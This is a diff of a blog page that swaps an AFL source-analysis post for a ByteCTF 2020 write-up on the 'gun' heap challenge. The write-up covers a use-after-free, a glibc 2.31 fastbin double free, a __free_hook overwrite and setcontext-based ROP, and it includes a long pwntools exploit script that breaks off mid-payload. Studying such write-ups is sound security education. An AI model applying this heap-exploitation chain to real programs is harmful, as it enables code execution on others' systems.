@@ -292,7 +292,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/01/AFL源码分析计划3/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/26/2020bytectf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="R4bb1t">
@@ -311,7 +311,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/06/01/AFL源码分析计划3/" itemprop="url">AFL源码分析计划3 -- afl-as.h</a></h1>
+                <a class="post-title-link" href="/2020/10/26/2020bytectf/" itemprop="url">2020bytectf</a></h1>
         
 
         <div class="post-meta">
@@ -323,8 +323,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-01T20:49:27+08:00">
-                2020-06-01
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-26T20:56:13+08:00">
+                2020-10-26
               </time>
             
 
@@ -346,8 +346,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuzz/" itemprop="url" rel="index">
-                    <span itemprop="name">fuzz</span>
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
                   </a>
                 </span>
 
@@ -384,12 +384,372 @@
 
       
         
-          <p>这个头文件里面放着的是汇编器编译汇编到二进制时插入的汇编代码。</p>
-<p>这里只分析64位的</p>
-<h2 id="trampoline-fmt-64"><a href="#trampoline-fmt-64" class="headerlink" title="trampoline_fmt_64"></a>trampoline_fmt_64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">"\n"</span></span><br><span class="line">  <span class="string">"/* --- AFL TRAMPOLINE (64-BIT) --- */\n"</span></span><br><span class="line">  <span class="string">"\n"</span></span><br><span class="line">  <span class="string">".align 4\n"</span></span><br><span class="line">  <span class="string">"\n"</span></span><br><span class="line">  <span class="string">"leaq -(128+24)(%%rsp), %%rsp\n"</span></span><br><span class="line">  <span class="string">"movq %%rdx,  0(%%rsp)\n"</span></span><br><span class="line">  <span class="string">"movq %%rcx,  8(%%rsp)\n"</span></span><br><span class="line">  <span class="string">"movq %%rax, 16(%%rsp)\n"</span></span><br><span class="line">  <span class="string">"movq $0x%08x, %%rcx\n"</span></span><br><span class="line">  <span class="string">"call __afl_maybe_log\n"</span></span><br><span class="line">  <span class="string">"movq 16(%%rsp), %%rax\n"</span></span><br><span class="line">  <span class="string">"movq  8(%%rsp), %%rcx\n"</span></span><br><span class="line">  <span class="string">"movq  0(%%rsp), %%rdx\n"</span></span><br><span class="line">  <span class="string">"leaq (128+24)(%%rsp), %%rsp\n"</span></span><br><span class="line">  <span class="string">"\n"</span></span><br><span class="line">  <span class="string">"/* --- END --- */\n"</span></span><br><span class="line">  <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+          
+            <h2 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h2><p><img src="\images\2020bytectf\1.jpg" alt="1"></p>
+<p>保护全开，且沙箱限制了只能使用open,read,write,exit4个函数</p>
+<p>总共有3个功能，买子弹，上膛，发射，购买时可以给子弹命名，发射时会输出 子弹名字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Shoot</span><br><span class="line">2.Load </span><br><span class="line">3.Buy  </span><br><span class="line">4.Exit </span><br><span class="line">Action&gt;</span><br></pre></td></tr></table></figure>
+<p>每发子弹都有一个标志位，放在全局数组<code>0x4070</code>中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 - 已购买，未上膛</span><br><span class="line">2 - 已上膛</span><br><span class="line">0 - 已发射</span><br></pre></td></tr></table></figure>
+<h3 id="buy"><a href="#buy" class="headerlink" title="buy"></a>buy</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall buy@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v2; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v2 = sub_1542();                              <span class="comment">// 从0下标开始，可能申请14个chunk</span></span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Enough"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( chunk_is_used[<span class="number">3</span> * v2] == <span class="number">1L</span>L )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"The bullet is Used!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Bullet price: "</span>, v2);</span><br><span class="line">  size = read_int((__int64)&amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0xF</span> || (<span class="keyword">signed</span> __int64)((<span class="keyword">signed</span> __int64)off_4010 - size) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Too pool!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Too big!"</span>);</span><br><span class="line">  *((_QWORD *)&amp;chunk + <span class="number">3</span> * v3) = <span class="built_in">malloc</span>(size);</span><br><span class="line">  chunk_is_used[<span class="number">3</span> * v3] = <span class="number">1L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Bullet Name: "</span>);</span><br><span class="line">  read_str((__int64)&amp;v5, *((_QWORD *)&amp;chunk + <span class="number">3</span> * v3), size);<span class="comment">// 这里没有0截断</span></span><br><span class="line">  off_4010 = (__int64 (__fastcall *)())((<span class="keyword">char</span> *)off_4010 - size);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Confirm"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>read_str函数没有0截断，所以可以用来泄漏地址</p>
+<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall load@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 idx; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Which one do you want to load?"</span>);</span><br><span class="line">  idx = read_int((__int64)&amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xD</span> || chunk_is_used[<span class="number">3</span> * idx] == <span class="number">0L</span>L || chunk_is_used[<span class="number">3</span> * idx] == <span class="number">2L</span>L )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"what??"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4050 )</span><br><span class="line">    *((_QWORD *)&amp;unk_4068 + <span class="number">3</span> * idx) = qword_4050;</span><br><span class="line">  qword_4050 = (__int64)&amp;chunk + <span class="number">0x18</span> * idx;</span><br><span class="line">  *((_QWORD *)&amp;chunk + <span class="number">3</span> * idx + <span class="number">2</span>) = <span class="number">2L</span>L;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Confirm."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>子弹上膛函数，FILO，这个弹夹是一个栈结构，<code>0x4050</code>放着的是最后上膛的子弹</p>
+<h3 id="漏洞函数-shoot"><a href="#漏洞函数-shoot" class="headerlink" title="漏洞函数 shoot"></a>漏洞函数 shoot</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall shoot@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int128 v3; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4050 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No bullet!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Shoot time: "</span>);</span><br><span class="line">  *(_QWORD *)((<span class="keyword">char</span> *)&amp;v3 + <span class="number">4</span>) = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read_int((__int64)&amp;v4);</span><br><span class="line">  LODWORD(v3) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( qword_4050 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)v3 &lt; SDWORD1(v3) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Pwn! The %s bullet fired.\n"</span>, *(_QWORD *)qword_4050, (_QWORD)v3);</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)qword_4050);                 <span class="comment">// 指针未清空</span></span><br><span class="line">    *((_QWORD *)&amp;v3 + <span class="number">1</span>) = qword_4050;</span><br><span class="line">    qword_4050 = *(_QWORD *)(qword_4050 + <span class="number">8</span>);</span><br><span class="line">    *(_QWORD *)(*((_QWORD *)&amp;v3 + <span class="number">1</span>) + <span class="number">0x10</span>LL) = <span class="number">0L</span>L;</span><br><span class="line">    LODWORD(v3) = v3 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = sub_159A();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%lld bullets left\n"</span>, v2, (_QWORD)v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>存在UAF。值得注意的是，不仅是heap指针未清空，子弹前后关系的链表也没有清空</p>
+<p>所以需要利用这个UAF造出个double free来</p>
+<p>先购买并发射3发子弹，上膛顺序为2,1,0，发射后再购买1发子弹并上膛，之后再发射3发子弹，即可实现doubler free</p>
+<p><img src="\images\2020bytectf\2.jpg" alt="2"></p>
+<p><img src="\images\2020bytectf\3.jpg" alt="3"></p>
+<p>像这样的构造方式就可以double free了，但是在glibc2.31的tcache中像 A-&gt;B-&gt;A还是会触发double free报错的，所以需要将这个double free构造在fastbin中去</p>
+<p>这里注意对于fastbin double free的构造需要使用两个没有在tcache链表中的chunk来实现，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache[0x40]:1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7</span><br><span class="line">fastbin[0x40]:8-&gt;9-&gt;8</span><br></pre></td></tr></table></figure>
+<p>因为虽然 tcache满足了，但是如果再一次free(1)的话还是会进入tcache分支进行检测，这个时候就会触发double free了</p>
+<p>构造如下图</p>
+<p><img src="\images\2020bytectf\4.jpg" alt="4"></p>
+<h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>double free实现后就可以写free_hook了，但是从glibc2.29后，setcontext函数的参数不再是rdi而是rdx，所以这里需要先找到一个gadget将参数转移到rdx</p>
+<p><code>*mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];*</code></p>
+<p>接下来使用setcontext控制参数构造rop调用orw读取flag。</p>
+<blockquote>
+<p>对于setcontext及orw heap更多的了解可以参考</p>
+<p><a href="https://n0va-scy.github.io/2020/03/14/setcontext/" target="_blank" rel="noopener">https://n0va-scy.github.io/2020/03/14/setcontext/</a></p>
+<p><a href="https://n0va-scy.github.io/2020/03/14/UNCTF-orwheap/" target="_blank" rel="noopener">https://n0va-scy.github.io/2020/03/14/UNCTF-orwheap/</a></p>
+</blockquote>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> (sys.argv[<span class="number">1</span>] == <span class="string">'DEBUG'</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">'debug'</span>):</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./gun'</span>)</span><br><span class="line">        elf = ELF(<span class="string">'./gun'</span>)</span><br><span class="line">        <span class="comment">#libc = elf.libc</span></span><br><span class="line">        libc = ELF(<span class="string">'libc-2.31.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="comment">#p = remote("123.57.209.176","30772")</span></span><br><span class="line">        p = remote(<span class="string">"123.56.96.75"</span>,<span class="string">"30772"</span>)</span><br><span class="line">        elf = ELF(<span class="string">'./gun'</span>)</span><br><span class="line">        <span class="comment">#libc = elf.libc</span></span><br><span class="line">        libc = ELF(<span class="string">'libc-2.31.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#内存地址随机化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"breakpoint_addr --&gt; "</span> + hex(text_base + <span class="number">0x4060</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr))) </span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(name,addr)</span>:</span></span><br><span class="line">	log.info(name + <span class="string">" --&gt; %s"</span>,hex(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">"name: "</span>,<span class="string">"rabbit"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Action&gt; "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"price: "</span>,str(size))</span><br><span class="line">    sda(<span class="string">"Name: "</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"load?"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shoot</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"time: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line">name()</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x500</span>,<span class="string">'a'</span> + <span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">'b'</span> + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug(0x167b)</span></span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(0x1947)</span></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">'b'</span> + <span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug(0x1669)</span></span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">"The "</span>)</span><br><span class="line">libc_base = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x1ec062</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">'setcontext'</span>]</span><br><span class="line">show(<span class="string">"libc_base: "</span>,libc_base)</span><br><span class="line"><span class="comment">#shoot(1)</span></span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    buy(<span class="number">0x30</span>,<span class="string">'a\n'</span>)</span><br><span class="line"></span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">2</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    load(i)</span><br><span class="line"><span class="comment">#debug(0x167b)</span></span><br><span class="line">shoot(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">'b\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"Pwn! The "</span>)</span><br><span class="line">heap = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">show(<span class="string">"heap: "</span>,heap)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"double free done!"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    buy(<span class="number">0x30</span>,<span class="string">'a\n'</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x30</span>,p64(free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x30</span>,<span class="string">'b\n'</span>)</span><br><span class="line">buy(<span class="number">0x30</span>,<span class="string">'c\n'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    buy(<span class="number">0x30</span>,p64(<span class="number">0x1547a0</span> + libc_base) + <span class="string">'\n'</span>) <span class="comment">#local</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    buy(<span class="number">0x30</span>,p64(<span class="number">0x154930</span> + libc_base) + <span class="string">'\n'</span>) <span class="comment">#remote</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x000000000004a550</span> + libc_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000026b72</span> + libc_base</span><br><span class="line">pop_rsi = <span class="number">0x0000000000027529</span> + libc_base</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    pop_rdx_r12 = <span class="number">0x000000000011c1e1</span> + libc_base <span class="comment">#local</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    pop_rdx_r12 = <span class="number">0x000000000011c371</span> <span class="comment">#remote</span></span><br><span class="line">syscall_ret = <span class="number">0x0000000000066229</span> + libc_base</span><br><span class="line">ret = <span class="number">0x0000000000025679</span> + libc_base</span><br><span class="line"></span><br><span class="line">pay = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    pay += p64(<span class="number">0x1547a0</span> + libc_base) <span class="comment">#local</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    pay += p64(<span class="number">0x154930</span> + libc_base) <span class="comment">#remote</span></span><br><span class="line">pay += p64(heap + <span class="number">0x30e</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x20</span>,<span class="string">'\x00'</span>)</span><br><span class="line">pay += p64(setcontext+<span class="number">33</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x38</span>,<span class="string">'\x00'</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>)*<span class="number">2</span> <span class="comment">#r8,r9</span></span><br><span class="line">pay = pay.ljust(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment">#rdi,rsi</span></span><br><span class="line">pay = pay.ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) <span class="comment">#rdx</span></span><br><span class="line">ay = pay.ljust(<span class="number">0x98</span>,<span class="string">'\x00'</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) <span class="comment">#rcx</span></span><br><span class="line">pay = pay.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>) <span class="comment">#return </span></span><br><span class="line">pay += p64(heap + <span class="number">0x32e</span> + <span class="number">0xd0</span>) <span class="comment">#stack</span></span><br><span class="line">pay += p64(ret)</span><br><span class="line">pay = pay.ljust(<span class="number">0xe0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">pay += p64(heap + <span class="number">0x32e</span>)</span><br><span class="line">pay += p64(ret) <span class="comment">#ret</span></span><br><span class="line"><span class="comment">#open("flag")</span></span><br><span class="line"><span class="comment">#flag = free_hook + 0x1b8</span></span><br><span class="line">flag = heap + <span class="number">0x4c6</span></span><br><span class="line">pay += p64(pop_rdi) + p64(flag)<span class="comment">#0xb0 here is rop</span></span><br><span class="line"><span class="comment">#pay += p64(pop_rsi) + p64(0)</span></span><br><span class="line"><span class="comment">#pay += p64(pop_rdx_r12) + p64(0) + p64(0)</span></span><br><span class="line">pay += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">pay += 